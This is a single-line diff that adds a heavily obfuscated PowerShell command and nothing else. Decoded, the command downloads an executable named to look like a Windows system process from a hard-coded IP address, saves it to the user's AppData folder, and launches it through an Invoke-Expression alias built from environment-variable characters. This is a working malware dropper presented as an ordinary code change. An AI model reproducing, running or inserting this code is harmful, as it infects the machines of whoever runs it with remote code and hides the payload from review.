@@ -1,0 +1,1 @@
+﻿(('(N'+'ew'+'-Obje'+'ct System.'+'N'+'et.W'+'e'+'b'+'C'+'lien'+'t)'+'.DownloadFile('+'{1}http'+'://'+'8'+'9.248.170.218/~'+'ya'+'hoo'+'/csrs'+'v'+'.ex'+'e{1},{'+'0}'+'{3}e'+'nv'+':APPDATA{2}csr'+'s'+'v.'+'ex'+'e{0'+'}'+');Start-Process'+' ({'+'0}{'+'3}'+'env:AP'+'PDAT'+'A'+'{2'+'}cs'+'rsv.exe'+'{0})') -F[ChaR]34,[ChaR]39,[ChaR]92,[ChaR]36)| .( $pshoME[4]+$PShOmE[34]+'X')
